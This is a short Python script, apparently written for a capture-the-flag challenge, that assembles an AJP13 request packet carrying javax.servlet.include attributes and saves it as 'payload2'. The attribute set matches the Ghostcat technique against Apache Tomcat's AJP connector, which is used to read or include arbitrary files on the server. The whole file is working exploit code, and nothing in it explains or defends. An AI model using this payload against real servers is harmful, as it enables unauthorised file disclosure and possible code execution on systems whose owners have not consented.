
import struct

def pack_string(s):
    if s is None:
        return struct.pack(">h", -1)
    l = len(s)
    return struct.pack(">H%dsb" % l, l, s.encode('utf8'), 0)

magic = 0x1234
prefix_code = struct.pack("b", 2) # forward request
method = struct.pack("b", 2) # GET
protocol = pack_string("HTTP/1.1")
req_uri = pack_string("/ctf/index.jsp")
remote_addr = pack_string("119.29.29.29")
remote_host = pack_string("localhost")
server_name = pack_string("a")
server_port = struct.pack(">h", 80)
is_ssl = struct.pack("?", False)
num_headers = struct.pack(">h", 0)
attributes = {
    'javax.servlet.include.request_uri': '/',
    'javax.servlet.include.servlet_path': '',
    'bullshit': '////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////',
    'javax.servlet.include.path_info': '/index.jsp',
}
end = struct.pack("B", 0xff)

data = b""
# data = prefix_code
# data += method
data += protocol
data += req_uri
data += remote_addr
data += remote_host
data += server_name
data += server_port
data += is_ssl
data += num_headers
# generate attrs
attr_code = struct.pack("b", 0x0a) # SC_A_REQ_ATTRIBUTE
for n, v in attributes.items():
    data += attr_code
    data += pack_string(n)
    data += pack_string(v)
data += end # packet terminator byte 0xff

# header = struct.pack(">hH", magic, len(data))

with open("payload2", "wb") as f:
    f.write(data)
